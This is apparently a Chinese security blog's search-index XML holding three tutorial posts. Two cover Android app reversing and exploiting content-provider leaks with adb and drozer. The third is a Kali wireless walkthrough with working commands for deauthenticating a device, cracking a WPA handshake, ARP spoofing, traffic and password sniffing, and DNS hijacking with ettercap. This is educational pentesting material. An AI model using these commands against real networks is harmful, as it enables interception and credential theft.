<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Android渗透测试（二）]]></title>
    <url>%2F2019%2F04%2F09%2FAndroid%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%EF%BC%88%E4%BA%8C%EF%BC%89%2F</url>
    <content type="text"><![CDATA[Android应用程序文件结构apk程序文件结构一般.apk程序包括以下文件和文件夹： Classes.dex （文件） AndroidManifest.xml （文件） META-INF （文件夹） resources.arsc （文件） res （文件夹） assets （文件夹） lib （文件夹） Android 应用程序组件Android 应用程序由各种组件组成，它们一起创建可工作的应用程序。 这些组件是活动，服务，广播接收器，内容供应器和共享首选项。 活动（Activity）：用户可以与之交互的可视界面。包括按钮，图像，TextView或任何其他可视组件。 服务（Service）：这些 Android 组件在后台运行，并执行开发人员指定的特定任务。这些任务包括从 HTTP 下载文件到在后台播放音乐等任何内容。 广播接收器（Broadcast Receiver）： Android 应用程序中的接收器，通过 Android 系统或设备中存在的其他应用程序，监听传入的广播消息。一旦它们接收到广播消息，就可以根据预定义的条件触发特定动作。条件可以为收到 SMS，来电呼叫，电量改变等等。 共享首选项（Shared Preference）：应用程序使用这些首选项，以便为应用程序保存小型数据集。此数据存储在名为shared_prefs的文件夹中。这些小数据集可以包括名值对，例如游戏中的用户得分和登录凭证。不建议在共享首选项中存储敏感信息，因为它们可能易受数据窃取和泄漏的影响。 意图（Intent）：这些组件用于将两个或多个不同的 Android 组件绑定在一起。意图可以用于执行各种任务，例如启动动作，切换活动和启动服务。 内容供应器（Content Provider）：这些组件用于访问应用程序使用的结构化数据集。应用程序可以使用内容供应器访问和查询自己的数据或存储在手机中的数据。 Android应用程序逆向Dex2jar逆向Android应用程序dex2jar将字节码（如Classes.dex）转换为可读文件的工具，将.dex文件转换为.jar文件。.dex文件是由java字节码转换的Dalvik字节码。从cmd转到dex2jar文件夹，运行以下命令使用dex2jar工具。12$ d2j-dex2jar.bat "X:\..\abc.apk" dex2jar X:\..\abc.apk -&gt; abc-dex2jar.jar dex2jar将.apk的.dex文件转换为.jar文件后，就可以使用Java图形查看器（如JD-GUI）打开.jar文件。微信7.0.3 for Android的java源代码。 注意：如果应用程序开发人员使用一些防止反编译的保护，如 proguard 和 dex2jar，我们使用 dex2jar 或 Apktool 反编译应用程序时，不会看到准确的源代码，而是一堆不同的源文件，并不是原始源代码。 ApkTool逆向Android应用程序另一种Android逆向的方法是将.dex文件转换为smali文件，smali是一种文件格式，其语法跟Jasmine语言类似。ApkTool的优点是操作是双向的，反编译一个程序后可以使用ApkTool重新编译，且编译生成一个新的.apk文件。 ApkTool反编译apk程序 1$ apktool d [app_name].apk -d：表示反编译。如果想重新编译一个应用程序，使用-b（build）参数。 1$ apktool b [folder name] [app_name].apk 网上有另外一款Virtuous Ten Studio（VTS）工具，其功能与ApkTool类似，只是提供了UI界面方便操作，但只能在windows下运行。下载地址： 1http://www.virtuous-ten-studio.com/ Android应用安全漏洞审计由于开发人员未严格遵守安全编码规范，或开发过程中的错误代码，导致Android应用程序出现各种类型的安全漏洞，下面将学习Android漏洞的挖掘和利用。 内容供应器泄漏许多应用程序使用内容供应器来存储和查询应用程序中的数据或来自电话的数据。 除非已经定义了内容提供者可以使用权限来访问，否则任何其他应用都可以使用应用所定义的内容供应器来访问应用的数据。 所有内容供应器具有唯一的统一资源标识符（URI）以便被识别和查询。 内容提供者的 URI 的命名标准惯例是以content://开始。如果 Android API 版本低于 17，则内容供应器的默认属性是始终导出。 这意味着除非开发人员指定权限，否则任何应用程序都可以使用应用程序的内容供应器来访问和查询数据。 所有内容供应器都需要在AndroidManifest.xml中注册。 因此，我们可以对应用程序使用 Apktool，并通过查看AndroidManifest.xml文件检查内容供应器。定义内容供应器的一般方法如下所示： 1234&lt;provider android:name="com.test.example.DataProvider" android:authorities ="com.test.example.DataProvider"&gt;&lt;/provider&gt; 下面查看一个内容供应器泄漏漏洞的例子，并尝试利用该漏洞。1.使用ApkTool对应用程序反编译。2.查看定义内容供应器的AndroidManifest.xml文件，也可以使用grep命令从代码中获取内容供应器.1$ grep -R 'content://' 3.为查询内容供应器并确认漏洞是可利用的，需要在Android设备或模拟器中安装该应用程序，使用以下命令在模拟器中安装该.apk文件。123$ adb install [app_name].apk Perfirming Streamed Install Success 然后可以创建一个没有任何权限的应用程序来查询存在漏洞的应用程序的内容供应器，可以使用adb查询内容供应器： 1$ adb shell content query --uri [URI of the content provider] Drozer是一款针对Android系统的安全测试框架，通过分析AndroidManifest.xml看四大组件中有无可export的，如果有就详细查看可export的组件是否真存在漏洞。下载地址：1https://labs.mwrinfosecurity.com/tools/drozer/ 安装后需要将代理组件agent.apk安装到模拟器，还需要在启动模拟器时转发一个特定端口31415建立连接。可以使用以下命令完成操作： 123$ adb install agent.apk$ adb forward tcp:31415 tcp:31415 启动drozer agent代理程序，单击”Embedded Server”&gt;”Disabled”启动服务器。 在cmd启动Drozer终端连接到模拟器：1$ drozer console connect 成功进入Drozer Console后，运行app.provider.finduri模块查找所有内容供应器。1dz&gt; run app.provider.finduri [URI of the content provider] 使用app.provider.query模块查询内容供应器URI，如果能够查询到来自内容供应器的数据，意味着内容供应器泄漏数据且存在漏洞，因为Drozer未被明确授予使用数据集的任何权限。 漏洞修复建议：在创建内容供应器时指定参数android:exported = false，或创建一些新的权限，其他程序在访问供应器之前必须请求它。]]></content>
      <categories>
        <category>Android安全</category>
      </categories>
      <tags>
        <tag>Android安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android渗透测试（一）]]></title>
    <url>%2F2019%2F04%2F06%2FAndroid%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[Android安全基础Dalvik虚拟机（DVM）；Android4.4版本之后，Android运行时（ART）。Android安全模型的核心是Linux特权分离。与Linux类似，用作命令的二进制文件位于/system/bin和/system/xbin；安装的应用程序位于/data/data；原始安装文件（.apk）存储在/data/app；从Play商店购买的应用程序存储在/data/app-private/。 Android虚拟环境配置Android Studio下载地址1https://developer.android.com/studio 汉化文件下载将汉化文件复制到X:\Android\Android Studio\lib\，重启生效。 Genymotion下载地址1https://www.genymotion.com/download/ 下载需要登录，分为包含virtualbox和不包含virtualbox两个版本。 Android Studio关联GenymotionAndroid Studio的File&gt;Setting&gt;Plugins&gt;Browse repositories，搜索Genymotion并安装，重启后生效。在工具栏出现Genymotion图标（如果找不到，打开视图勾选工具栏），点击提示关联Genymotion路径。 渗透测试实用工具Android Debug BridgeAndroid Debug Bridge 是一个客户端 - 服务器程序，允许用户与模拟器器或连接的 Android 设备交互。 它包括客户端（在系统上运行），处理通信的服务器（也在系统上运行）以及作为后台进程在模拟器和设备上上运行的守护程序。 客户端用于 ADB 通信的默认端口始终是 5037，设备使用从 5555 到 5585 的端口。使用cmd运行adb devices命令与已启动的模拟器交互。 使用pm包管理器获取已安装的软件包列表 1$ adb shell pm list packages 使用dumpsys meminfo获取全部应用程序及当前内存占用列表 1$ adb shell dumpsys meminfo 使用logcat（读取Android设备事件日志的工具），并保存到指定文件 1$ adb logcat -d -f /data/local/logcats.log Android SDK中的MonkeyRunner工具用于自动化和测试Android应用程序，甚至与应用程序交互。如，为了使用10个自动化触摸，敲击和事件来测试应用程序，可以在adb shell中使用monkey 10命令 1$ monkey 10 Burp SuiteBurp Suite配置好之后，使用以下命令使用代理。 1$ emulator -avd [name of the avd] -http-proxy 127.0.0.1:8080 ApkToolApkTool下载 将下载的文件解压保存在任一目录，并配置path环境变量，就可以在cmd中使用apktool命令。 Dex2jar下载地址1https://code.google.com/p/dex2jar/ Dex2jar下载 JD-GUI下载地址1http://jd.benow.ca/ JD-GUI下载]]></content>
      <categories>
        <category>Android安全</category>
      </categories>
      <tags>
        <tag>Android安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kali Linux无线渗透初探]]></title>
    <url>%2F2019%2F04%2F06%2FKali%20Linux%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%88%9D%E6%8E%A2%2F</url>
    <content type="text"><![CDATA[新购入无线网卡一枚，用于学习kali linux下的无线渗透内容。前期准备工作不多赘述，直接进入实操实战阶段。 前期渗透启用无线网卡1$ ifconfig wlan0 up 开启网卡监听模式1$ airmon-ng start wlan0 输入ifconfig命令查看网卡名称变为wlan0mon；输入iwconfig命令确认mode为monitor模式。 扫描附近wifi热点1$ airodump-ng wlan0mon BSSID是路由器MAC地址，CH是无线信道。 对目标路由器进行抓包1$ airodump-ng -c 1 --bssid ff:ff:ff:ff:ff:ff -w cap wlan0mon -c：信道–bssid：路由器MAC地址-w：指定抓到的包存放文件 此时可查看路由器接入的设备MAC地址，但是无法抓取设备发送到路由器的密码认证数据包，需要将目标设备踢下线自动重连，抓取认证握手包。 将目标设备踢下线1$ aireplay-ng -0 10 -a ff:ff:ff:ff:ff:ff -c 00:00:00:00:00:00 wlan0mon -0：发送n条认证消息-a：路由器MAC地址-c：目标设备MAC地址 看到[WPA handshark:]代表成功抓取认证握手数据包。保存的文件目录中有cap-01.cap文件，通过爆破方式可解密认证密码。 密码爆破1$ aircrack-ng cap-01.cap -w password.txt 内网漫游接下来要对目标设备进行进一步攻击，如ARP欺骗、DNS劫持，等。 关闭网卡监听模式1$ airmon-ng stop wlan0mon 用爆破得到的密码连入目标无线网络，查看获取的IP地址，可推断出网关地址。 用nmap扫描内网就可获取已接入的主机信息。 nmap扫描主机1$ nmap -sP 192.168.1.1/24 选择一台目标靶机，并开启流量转发功能，使靶机流量先经过kali再到路由器。 流量转发1$ echo 1 &gt; /proc/sys/net/ipv4/ip_forward 然后cat /proc/sys/net/ipv4/ip_forward，如果返回1代表流量转发成功。 对靶机进行ARP欺骗1$ arpspoof -i wlan0 -t 192.168.1.3 -r 192.168.1.1 -i：网卡名称-t：目标靶机IP地址-r：网关IP地址 此时已成功完成中间人攻击，可获取靶机到路由器的全部流量信息，可使用其他工具分析流量信息。 使用driftnet监听浏览的图片1$ driftnet -i wlan0 使用wireshark分析包内容，或抓取账号密码1$ wireshark &amp; DNS劫持首先添加一条解析 1$ vi /etc/ettercap/etter.dns 例：www.google.com A 1.1.1.1 然后打开ettercap，[sniff]&gt;[Unified sniffing]，选择wlan0网卡，[Plugins]&gt;[Manage the plugins]，双击dns_spoof模块，最后[start]&gt;[start sniffing]。此时靶机打开google会解析到1.1.1.1，成功完成DNS劫持。 以上攻击时建立在http协议上，对于https协议，可使用sslstrip对https进行降级，但会导致浏览器提示证书报错，对https协议攻击会另写一篇进行说明。]]></content>
      <categories>
        <category>无线网络渗透</category>
      </categories>
      <tags>
        <tag>无线渗透测试</tag>
      </tags>
  </entry>
</search>
